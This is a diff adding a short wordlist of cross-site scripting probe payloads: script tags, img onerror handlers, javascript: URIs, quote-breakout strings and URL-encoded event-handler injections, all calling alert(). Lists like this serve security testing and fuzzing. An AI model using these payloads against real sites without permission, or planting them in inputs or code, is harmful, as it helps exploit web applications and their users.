@@ -1,0 +1,27 @@
+alert()
+alert;throw 1
+javascript:alert()
+
+<script>alert()</script>
+<script>alert;throw 1</script>
+<img src=1 onerror=alert()>
+
+"><script>alert()</script>"
+"><script>alert;throw 1</script>"
+"><img src=1 onerror=alert()>"
+
+'><script>alert()</script>'
+'><script>alert;throw 1</script>'
+'><img src=1 onerror=alert()>'
+
+%20onload=alert()
+%20onerror=alert()
+%20autofocus%20onfocus=alert()
+
+"onload="alert()
+"onerror="alert()
+"autofocus%20onfocus="alert()
+
+'onload='alert()
+'onerror='alert()
+'autofocus%20onfocus='alert()
